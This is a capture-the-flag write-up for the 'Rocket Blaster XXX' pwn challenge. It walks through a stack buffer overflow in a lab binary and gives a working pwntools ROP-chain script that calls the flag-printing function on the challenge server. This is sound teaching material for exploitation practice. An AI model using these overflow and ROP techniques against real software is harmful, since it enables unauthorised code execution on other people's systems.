# Cyber Apocalypse 2024

## Rocket Blaster XXX

> Prepare for the ultimate showdown! Load your weapons, gear up for battle, and dive into the epic fray—let the fight commence!
> 
> Author: w3th4nds
> 
> [`pwn_rocket_blaster_xxx.zip`](pwn_rocket_blaster_xxx.zip)

Tags: _pwn_

## Solution
The challenge comes with a binary which we open with Ghidra. The main function is very short and we can see we definitely have an buffer overflow. Checking the security measurements in place with `checksec` tells us no `canary` is used (also we see this in our decompiled code), so we can `ROP`. 

```c
undefined8 main(void)
{
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  banner();
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  fflush(stdout);
  printf(
        "\nPrepare for trouble and make it double, or triple..\n\nYou need to place the ammo in the right place to load the Rocket Blaster XXX!\n\n>> "
        );
  fflush(stdout);
  read(0,&local_28,0x66);
  puts("\nPreparing beta testing..");
  return 0;
}
```

There is even a win function `fill_ammo` that prints the flag to us. The only thing to consider is, the function takes a few parameters we need to take care of. Since the binary is not a `Position Independent Executable (PIE)` we can just take the address of `fill_ammo` Ghidra shows us, since the base address stays fixed.

```c
void fill_ammo(long param_1,long param_2,long param_3)
{
  ssize_t sVar1;
  char local_d;
  int local_c;
  
  local_c = open("./flag.txt",0);
  if (local_c < 0) {
    perror("\nError opening flag.txt, please contact an Administrator.\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (param_1 != 0xdeadbeef) {
    printf("%s[x] [-] [-]\n\n%sPlacement 1: %sInvalid!\n\nAborting..\n",&DAT_00402010,&DAT_00402008,
           &DAT_00402010);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (param_2 != 0xdeadbabe) {
    printf(&DAT_004020c0,&DAT_004020b6,&DAT_00402010,&DAT_00402008,&DAT_00402010);
                    /* WARNING: Subroutine does not return */
    exit(2);
  }
  if (param_3 != 0xdead1337) {
    printf(&DAT_00402100,&DAT_004020b6,&DAT_00402010,&DAT_00402008,&DAT_00402010);
                    /* WARNING: Subroutine does not return */
    exit(3);
  }
  printf(&DAT_00402140,&DAT_004020b6);
  fflush(stdin);
  fflush(stdout);
  while( true ) {
    sVar1 = read(local_c,&local_d,1);
    if (sVar1 < 1) break;
    fputc((int)local_d,stdout);
  }
  close(local_c);
  fflush(stdin);
  fflush(stdout);
  return;
}
```

The following script does exactly this, initializes the parameters the function takes and calls `fill_ammo`. One minor thing to note is the extra `ret` at the beginning of the `rop-chain`. This is needed to keep the stack `16 byte aligned`. If this is not done the program will crash in this case as some of the following instructions are relying on correct memory alignment.

```python
from pwn import *

p = remote("94.237.54.161", 40777)

pop_rdi = 0x0040159f
pop_rsi = 0x0040159d
pop_rdx = 0x0040159b
ret     = 0x0040101a
offset  = 0x28

context.binary = b = ELF("./rocket_blaster_xxx")
payload = flat({
    offset: [
        ret,
        pop_rdi,
        0xdeadbeef,
        pop_rsi,
        0xdeadbabe,
        pop_rdx,
        0xdead1337,
        b.sym.fill_ammo
    ]
})
p.sendline(payload)
p.interactive()
```

Flag `HTB{b00m_b00m_r0ck3t_2_th3_m00n}`